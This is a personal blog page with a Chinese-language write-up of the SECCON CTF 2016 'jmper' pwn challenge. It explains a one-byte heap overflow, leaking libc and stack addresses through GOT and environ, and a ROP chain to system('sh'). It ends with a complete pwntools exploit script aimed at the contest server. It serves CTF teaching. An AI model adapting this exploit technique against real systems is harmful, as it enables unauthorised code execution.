@@ -1,0 +1,402 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8"/>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <title>  [SECCON CTF 2016 Quals] jmper 300
+ | naetw's blog</title>
+
+    <meta name="author" content="Naetw"/>
+
+    <!-- Bootstrap -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/css/bootstrap.min.css"/>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"/>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/magnific-popup.js/1.1.0/magnific-popup.min.css"/>
+    <link rel="stylesheet" href="https://naetw.github.io/theme/css/jquery.mglass.css"/>
+    <link rel="stylesheet" href="https://naetw.github.io/theme/css/pygment-solarized-dark.css"/>
+    <link rel="stylesheet" href="https://naetw.github.io/theme/css/style.css"/>
+
+    <!-- Fonts -->
+    <link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet' type='text/css'/>
+    <link href='https://fonts.googleapis.com/css?family=Istok+Web' rel='stylesheet' type='text/css'/>
+    <link href='https://fonts.googleapis.com/css?family=Droid+Sans+Mono' rel='stylesheet' type='text/css'/>
+
+
+    <link rel="icon" href="https://naetw.github.io/favicon.ico" type="image/x-icon">
+    <link rel="shortcut icon" href="https://naetw.github.io/favicon.ico" type="image/x-icon">
+
+    <!-- Feeds -->
+      <link href="https://naetw.github.io/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="naetw&#39;s blog - All posts - Atom Feed"/>
+      <link href="https://naetw.github.io/feeds/write-up.atom.xml" type="application/atom+xml" rel="alternate" title="naetw&#39;s blog - Category: write-up - Atom Feed"/>
+
+
+  </head>
+
+  <body>
+
+    <div class="container">
+
+      <div class="page-header">
+        <h1><a href="https://naetw.github.io">naetw's blog</a> <small></small></h1>
+      </div>
+
+      <nav class="navbar navbar-default">
+
+        <!-- Hamburger menu for mobile -->
+        <div class="navbar-header">
+          <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#plumage-navbar-collapse-1" aria-expanded="false">
+            <span class="sr-only">Toggle navigation</span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+          </button>
+          <a class="navbar-brand" href="https://naetw.github.io" title="">naetw's blog</a>
+        </div>
+
+        <!-- Menus and search forms -->
+        <div class="collapse navbar-collapse" id="plumage-navbar-collapse-1">
+
+          <ul class="nav navbar-nav">
+<li >
+                <a href="/archives">Archives</a>
+              </li>
+<li >
+                <a href="/categories">Categories</a>
+              </li>
+<li >
+                <a href="/tags">Tags</a>
+              </li>
+          </ul>
+
+
+
+        </div>
+
+      </nav>
+
+    </div>
+
+
+    <div class="container main">
+
+
+      <div class="row">
+        <div class=" col-md-9  ">
+  <h1>
+    <a href="https://naetw.github.io/posts/2016/12/12/seccon-ctf-2016-quals-jmper-300/" rel="bookmark" title="Permalink to [SECCON CTF 2016 Quals] jmper 300">[SECCON CTF 2016 Quals] jmper 300</a>
+  </h1>
+        </div>
+      </div>
+
+      <div class="row">
+
+
+        <div class=" col-md-9 " id="content" role="main">
+  
+
+  <div>
+    <h2>Description</h2>
+<blockquote>
+<p>這題跟 cheer_msg 其實差不多，然後解法發現也跟以前解過的 <a href="http://train.cs.nctu.edu.tw/problems/16">applestore</a> 很像，有紀錄以前的 writeup 真是太好了，記憶障礙的時候可以回顧一下</p>
+</blockquote>
+<h2>Analyzing</h2>
+<blockquote>
+<p>64 bit ELF, FULL RELRO, 沒有 canary, 有 NX, 沒有 PIE</p>
+</blockquote>
+<p>這支程式也很小，不過用了一個從沒看過的 function，<code>setjmp</code> 跟 <code>longjmp</code>，簡單的介紹可以看 <a href="http://www.cnblogs.com/hazir/p/c_setjmp_longjmp.html">jmp</a>，最後會需要瞭解這兩個 function 才能完成 exploit</p>
+<p>main 裡面沒什麼重要的東西，除了 <code>setjmp</code> 之外，在 <code>setjmp</code> 之後會呼叫 <code>f</code></p>
+<p><code>f</code> 蠻長的，但主要就是實作以下功能:</p>
+<ol>
+<li>Add student</li>
+<li>Name student</li>
+<li>Write memo</li>
+<li>Show name</li>
+<li>Show memo</li>
+<li>Bye</li>
+</ol>
+<h3>Add student:</h3>
+<p>會先 <code>malloc</code> 一塊 48 bytes 的空間，第一格存著 student_num 也就是 ID，第六格存著存放名字的 heap address</p>
+<h3>Name student:</h3>
+<p>這裡會先要求輸入 ID，然後就可以開始取名字，這裡存在 <strong>one-byte overflow</strong>，但是這裡我沒用到，這裡之後用來 overwrite return address</p>
+<h3>Write memo:</h3>
+<p>這裡一樣先要求輸入 ID，這裡主要是改 student heap 的第二格到第四格，但是這裡存在著 <strong>one-byte overflow</strong>，所以我們可以利用這個來修改 name heap 的 address</p>
+<h3>Show name:</h3>
+<p>就 dump 出 name</p>
+<h3>Show memo:</h3>
+<p>同上</p>
+<h3>Bye:</h3>
+<p><code>exit(0)</code></p>
+<h2>Exploit</h2>
+<p>所以想法很簡單，用 A 學生 <strong>one-byte overflow</strong> 來修改 A 學生 name heap 的位置，把它指向 B 學生的第六格，也就是存放 B 學生 name heap 那格，接著用 A 學生來改 B 學生 name heap address，就可以進行 <strong>leak info</strong> 跟 <strong>overwrite</strong></p>
+<h3>First:</h3>
+<p>新增兩名學生，然後呼叫 A 學生的 <code>write_memo</code>，利用 <strong>one-byte overflow</strong> 把 A 學生 name heap address 改掉</p>
+<p>student heap layout:</p>
+<div class="highlight"><pre><span></span>             +------------------+
+             |.........prev_size|
+             |..............size|
+studentA     |.......student_num|
+             |..................| memo
+             |..................|
+             |..................|
+             |..................|
+             |........nameA_heap|
+             +------------------+
+             |.........prev_size|
+             |..............size|
+studentB     |.......student_num|
+             |..................| memo
+             |..................|
+             |..................|
+             |..................|
+             |........nameB_heap|
+             +------------------+
+</pre></div>
+
+
+<p>real memory layout:</p>
+<div class="highlight"><pre><span></span><span class="mh">0x6031e0</span><span class="o">:</span>       <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>
+<span class="mh">0x6031f0</span><span class="o">:</span>       <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>
+<span class="mh">0x603200</span><span class="o">:</span>       <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000603220</span> <span class="err">#</span> <span class="n">nameA_heap</span>
+<span class="mh">0x603210</span><span class="o">:</span>       <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000031</span>
+<span class="mh">0x603220</span><span class="o">:</span>       <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>
+<span class="mh">0x603230</span><span class="o">:</span>       <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>
+<span class="mh">0x603240</span><span class="o">:</span>       <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000041</span>
+<span class="mh">0x603250</span><span class="o">:</span>       <span class="mh">0x0000000000000001</span>      <span class="mh">0x0000000000000000</span>
+<span class="mh">0x603260</span><span class="o">:</span>       <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>
+<span class="mh">0x603270</span><span class="o">:</span>       <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000603290</span> <span class="err">#</span> <span class="n">nameB_heap</span>
+
+<span class="err">#</span> <span class="n">after</span> <span class="n">one</span><span class="o">-</span><span class="n">byte</span> <span class="n">overflow</span>
+
+<span class="mh">0x6031e0</span><span class="o">:</span>       <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>
+<span class="mh">0x6031f0</span><span class="o">:</span>       <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>
+<span class="mh">0x603200</span><span class="o">:</span>       <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000603278</span> <span class="err">#</span> <span class="n">address</span> <span class="n">of</span> <span class="n">storing</span> <span class="n">nameB_heap</span>
+<span class="mh">0x603210</span><span class="o">:</span>       <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000031</span>
+<span class="mh">0x603220</span><span class="o">:</span>       <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>
+<span class="mh">0x603230</span><span class="o">:</span>       <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>
+<span class="mh">0x603240</span><span class="o">:</span>       <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000041</span>
+<span class="mh">0x603250</span><span class="o">:</span>       <span class="mh">0x0000000000000001</span>      <span class="mh">0x0000000000000000</span>
+<span class="mh">0x603260</span><span class="o">:</span>       <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>
+<span class="mh">0x603270</span><span class="o">:</span>       <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000603290</span>
+</pre></div>
+
+
+<h3>Second:</h3>
+<p>接著我們為 student A 命名，就可以 overwrite student B name heap 的 address，把 address 改成隨便一個 libc function 的 GOT entry 在這我是 leak <code>puts</code>，之後再用 <code>show name</code> 就可以 leak info</p>
+<p>after overwrite:</p>
+<div class="highlight"><pre><span></span><span class="mh">0x6031e0</span><span class="o">:</span>       <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>
+<span class="mh">0x6031f0</span><span class="o">:</span>       <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>
+<span class="mh">0x603200</span><span class="o">:</span>       <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000603278</span>
+<span class="mh">0x603210</span><span class="o">:</span>       <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000031</span>
+<span class="mh">0x603220</span><span class="o">:</span>       <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>
+<span class="mh">0x603230</span><span class="o">:</span>       <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>
+<span class="mh">0x603240</span><span class="o">:</span>       <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000041</span>
+<span class="mh">0x603250</span><span class="o">:</span>       <span class="mh">0x0000000000000001</span>      <span class="mh">0x0000000000000000</span>
+<span class="mh">0x603260</span><span class="o">:</span>       <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>
+<span class="mh">0x603270</span><span class="o">:</span>       <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000601fa0</span> <span class="err">#</span> <span class="n">GOT</span> <span class="n">entry</span> <span class="n">of</span> <span class="n">puts</span>
+</pre></div>
+
+
+<h3>Third:</h3>
+<p>有 <strong>libc base address</strong> 之後，我們就可以拿到 <strong>system address</strong>，但是因為這題有 FULL RELRO 的保護，所以 GOT entry 不可以修改，因此，我們需要修改 stack 上的 return address</p>
+<p>libc 裡面有一個 symbol - <code>environ</code> 裡面存著 stack address，所以重複 step first &amp; second，來拿 stack address，之後算一下 offset 就可以知道 <code>main</code> 的 return address 的位置</p>
+<p>這裡為什麼要用 <code>main</code>，因為 <code>f</code> 這個 function 只有兩種離開方式，一個是利用 <code>longjmp</code> 另一個是利用 <code>exit(0)</code>，所以我們必須要用到 <code>longjmp</code> 回到 <code>main</code>，再控制 eip</p>
+<h3>Fourth:</h3>
+<p>在這步驟我們需要做兩件事，把 "sh" 寫上 memory (或是直接利用 libc 裡的 "sh")，把 <code>main</code> 的 return address 寫掉，偽造 system function call</p>
+<p>因為我們需要 <code>longjmp</code> 讓程式跳回 <code>main</code>，在 add student 裡，他會檢查學生人數是不是超過 30 如果超過就會呼叫 <code>longjmp</code>，所以我把 "sh" 寫在 student_num 這個 global variable，這樣下次呼叫 add student 就會跳回 <code>main</code>，然後 return 開 shell</p>
+<h2>Final Exploit:</h2>
+<div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env python</span>
+
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="c1">#r = remote(&#39;127.0.0.1&#39;, 4000)</span>
+<span class="c1">#libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)</span>
+<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;jmper.pwn.seccon.jp&#39;</span><span class="p">,</span> <span class="mi">5656</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;libc-2.19.so-8674307c6c294e2f710def8c57925a50e60ee69e&#39;</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">add</span><span class="p">():</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;6. Bye :)&#39;</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">name</span><span class="p">(</span><span class="n">ID</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;6. Bye :)&#39;</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;ID:&#39;</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">ID</span><span class="p">))</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Input name:&#39;</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">wmemo</span><span class="p">(</span><span class="n">ID</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;6. Bye :)&#39;</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;ID:&#39;</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">ID</span><span class="p">))</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Input memo:&#39;</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">sname</span><span class="p">(</span><span class="n">ID</span><span class="p">):</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;6. Bye :)&#39;</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;4&#39;</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;ID:&#39;</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">ID</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">smemo</span><span class="p">(</span><span class="n">ID</span><span class="p">):</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;6. Bye :)&#39;</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;5&#39;</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;ID:&#39;</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">ID</span><span class="p">))</span>
+
+
+<span class="n">add</span><span class="p">()</span>
+<span class="n">add</span><span class="p">()</span>
+<span class="n">wmemo</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">32</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\x78</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">name</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x601fa0</span><span class="p">))</span>
+<span class="n">sname</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">puts</span> <span class="o">=</span> <span class="p">(</span><span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="mi">6</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="mi">2</span><span class="p">))</span>
+<span class="n">base</span> <span class="o">=</span> <span class="n">puts</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
+<span class="n">system</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
+<span class="n">stack</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;environ&#39;</span><span class="p">]</span>
+
+<span class="n">name</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">stack</span><span class="p">))</span>
+<span class="n">sname</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">stack</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="mi">6</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="mi">2</span><span class="p">)</span>
+<span class="n">pop_rdi_ret</span> <span class="o">=</span> <span class="mh">0x400cc3</span>
+
+<span class="n">name</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x602028</span><span class="p">))</span>
+<span class="n">name</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">name</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">stack</span><span class="o">-</span><span class="mi">240</span><span class="p">))</span> <span class="c1"># overwrite main_ret_address</span>
+<span class="n">name</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x602028</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>
+
+<span class="n">add</span><span class="p">()</span> <span class="c1"># call longjmp in order to back to main</span>
+
+<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
+  </div>
+
+
+
+        </div>
+
+          <div class="col-md-3">
+  <div class="well">
+
+    <p><abbr title="2016-12-12T11:44:00+08:00"><i class="fa fa-calendar"></i> Mon 12 December 2016</abbr></p>
+
+      <p><address>
+        <i class="fa fa-user"></i> By
+          <a href="https://naetw.github.io/author/naetw.html" rel="author">Naetw</a>
+      </address></p>
+
+    <hr/>
+
+      <p>
+              <a href="https://naetw.github.io/category/write-up/" rel="tag"
+                  data-toggle="tooltip" class="label label-info"
+                  title="10 articles in this category">write-up</a>
+            <a href="/tag/ctf/" data-toggle="tooltip"
+      class="label label-default"
+      title="10 articles with this tag">CTF</a>
+            <a href="/tag/pwn/" data-toggle="tooltip"
+      class="label label-default"
+      title="10 articles with this tag">pwn</a>
+            <a href="/tag/heap/" data-toggle="tooltip"
+      class="label label-default"
+      title="5 articles with this tag">Heap</a>
+            <a href="/tag/rop/" data-toggle="tooltip"
+      class="label label-default"
+      title="4 articles with this tag">ROP</a>
+            <a href="/tag/seccon/" data-toggle="tooltip"
+      class="label label-default"
+      title="2 articles with this tag">SECCON</a>
+            <a href="/tag/one-byte-overflow/" data-toggle="tooltip"
+      class="label label-default"
+      title="1 article with this tag">One-byte Overflow</a>
+      </p>
+      <hr/>
+
+
+
+  </div>
+            
+          </div>
+
+      </div>
+
+    </div>
+
+    <!-- TODO: make footer sticky -->
+    <footer class="container-fluid">
+      <div class="container">
+        <div class="row">
+
+            <div class="col-md-2">
+                <h5>Social</h5>
+                <ul class="list-unstyled">
+                  <li>  <a href="https://github.com/Naetw">
+      <i class="fa fa-github"></i>
+    GitHub
+  </a></li>
+                </ul>
+            </div>
+            <div class="col-md-2">
+                <h5>Links</h5>
+                <ul class="list-unstyled">
+                  <li>  <a href="http://getpelican.com/">
+      <img src="https://besticon-demo.herokuapp.com/icon?url=getpelican.com&size=16" width="16" height="16" class="icon" alt="getpelican.com icon"/>
+    Pelican
+  </a></li>
+                </ul>
+            </div>
+
+          <div class="col-md-2">
+            <h5>Browse content by</h5>
+            <ul class="list-unstyled">
+                <li><a href="https://naetw.github.io/categories/index.html"><i class="fa fa-tags"></i> Categories</a></li>
+                <li><a href="https://naetw.github.io/archives/index.html"><i class="fa fa-calendar"></i> Dates</a></li>
+                <li><a href="https://naetw.github.io/tags/index.html"><i class="fa fa-tag"></i> Tags</a></li>
+            </ul>
+          </div>
+
+          <div class="col-md-2 text-muted">
+            <h5>Copyright notice</h5>
+            <p>© Copyright 2016-2017 Naetw.</p>
+          </div>
+
+          <div class="col-md-2 text-muted">
+            <h5>Disclaimer</h5>
+              <p>All opinions expressed in this site are my own personal opinions and are not endorsed by, nor do they represent the opinions of my previous, current and future employers or any of its affiliates, partners or customers.</p>
+          </div>
+
+          <div class="col-md-2">
+              <h5>Feeds</h5>
+              <ul class="list-unstyled">
+                  <li><small><a href="https://naetw.github.io/feeds/all.atom.xml"><i class="fa fa-rss"></i> All posts (Atom)</a></small></li>
+                  <li><small><a href="https://naetw.github.io/feeds/write-up.atom.xml"><i class="fa fa-rss"></i> Category: write-up (Atom)</a></small></li>
+              </ul>
+          </div>
+
+        </div>
+      </div>
+
+      <h5 class="text-right"><a href="#"><i class="fa fa-arrow-up"></i> Back to top</a></h5>
+
+      <div class="container">
+        <div class="row col-md-12 text-muted text-center">
+          Site generated by <a href="https://getpelican.com"> Pelican</a>.<br/>
+          <a href="https://github.com/kdeldycke/plumage"> Plumage</a> theme by <a href="https://kevin.deldycke.com">Kevin Deldycke</a>.
+        </div>
+      </div>
+
+    </footer>
+
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/js/bootstrap.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/magnific-popup.js/1.1.0/jquery.magnific-popup.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fitvids/1.1.0/jquery.fitvids.min.js"></script>
+    <script src="https://naetw.github.io/theme/js/jquery.mglass.js"></script>
+    <script src="https://naetw.github.io/theme/js/application.js"></script>
+
+  </body>
+</html>
